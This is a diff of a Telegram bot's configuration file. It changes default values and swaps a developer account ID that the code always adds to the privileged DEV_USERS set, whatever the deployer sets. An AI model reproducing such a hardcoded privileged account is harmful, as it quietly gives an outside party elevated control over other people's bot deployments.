@@ -46,10 +46,10 @@ if ENV:
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     NO_LOAD = os.environ.get("NO_LOAD", "").split()
     START_IMG = os.environ.get(
-        "START_IMG", "https://files.catbox.moe/zpzvgk.jpg"
+        "START_IMG", "https://files.catbox.moe/88u4eu.jpg"
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "InfoRobotCalvin")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "482489951").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "7834641788").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -143,7 +143,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5510539512)
+DEV_USERS.add(7834641788)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
